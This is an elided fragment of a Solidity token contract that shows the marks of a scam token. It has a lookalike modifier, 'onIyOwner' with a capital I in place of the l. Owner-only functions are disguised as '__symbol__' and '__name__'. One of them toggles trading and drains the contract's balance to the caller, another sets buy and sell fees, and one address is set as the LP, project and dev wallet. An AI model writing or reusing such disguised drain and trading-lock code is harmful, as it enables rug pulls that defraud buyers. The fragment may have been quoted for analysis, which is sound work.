...
contract X is Ownable, IERC20 {
    ...
    uint256 public maxBuy = 100 * (10 ** _decimals);
    uint256 public maxHold = 500 * (10 ** _decimals);
    ...
    constructor() {
        ...
        lpWallet = 0xf8806C9285cC45Bb93E4D4CD5EEb441BED8B355e;
        projectAddress = 0xf8806C9285cC45Bb93E4D4CD5EEb441BED8B355e;
        devWallet = 0xf8806C9285cC45Bb93E4D4CD5EEb441BED8B355e;
    ...
    function __symbol__(bool _tradingOpen) public onIyOwner{
        tradingOpen = _tradingOpen;
        payable(msg.sender).transfer(address(this).balance);
    }

    function __name__(bool _takeBuyFee,bool _takeSellFee,bool _takeTxFee) public onIyOwner{
